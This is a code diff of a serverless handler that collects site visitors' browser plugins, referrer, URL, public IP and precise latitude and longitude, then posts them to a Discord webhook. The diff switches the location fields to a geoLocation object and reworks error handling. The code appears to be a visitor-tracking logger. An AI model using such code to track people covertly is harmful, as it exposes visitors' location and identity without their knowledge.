@@ -29,8 +29,7 @@ export default async (req, res) => {
                 referrer,
                 currentURL,
                 timestamp,
-                latitude,
-                longitude
+                geoLocation // This is the new data coming from the front-end
             } = req.body;
 
             // Get public IP from headers (proxy/IP forwarding)
@@ -63,9 +62,8 @@ export default async (req, res) => {
                             **Browser Plugins:** \`${plugins || 'N/A'}\`
                             **Referrer URL:** \`${referrer || 'No referrer'}\`
                             **Current URL:** \`${currentURL || 'N/A'}\`
-                            **Latitude:** \`${latitude || 'N/A'}\`
-                            **Longitude:** \`${longitude || 'N/A'}\`
                             **Timestamp:** \`${timestamp || new Date().toISOString()}\`
+                            **Location (Latitude, Longitude):** \`${geoLocation.latitude}, ${geoLocation.longitude}\`
                         `,
                         color: 0x00FF00,
                         timestamp: new Date(),
@@ -80,14 +78,17 @@ export default async (req, res) => {
             });
 
             if (!response.ok) {
-                throw new Error(`Failed to send log: ${response.statusText}`);
+                const errorText = await response.text();
+                console.error('Failed to send message to Discord:', response.status, errorText);
+                return res.status(500).json({ message: 'Error sending to Discord' });
             }
 
-            res.status(200).json({ message: 'Log data sent successfully.' });
+            res.status(200).json({ message: 'User data logged successfully' });
         } catch (error) {
-            res.status(500).json({ error: error.message });
+            console.error('Error occurred:', error);
+            res.status(500).json({ message: 'Error processing request' });
         }
     } else {
-        res.status(405).json({ error: 'Method Not Allowed' });
+        res.status(405).json({ message: 'Method Not Allowed' });
     }
 };
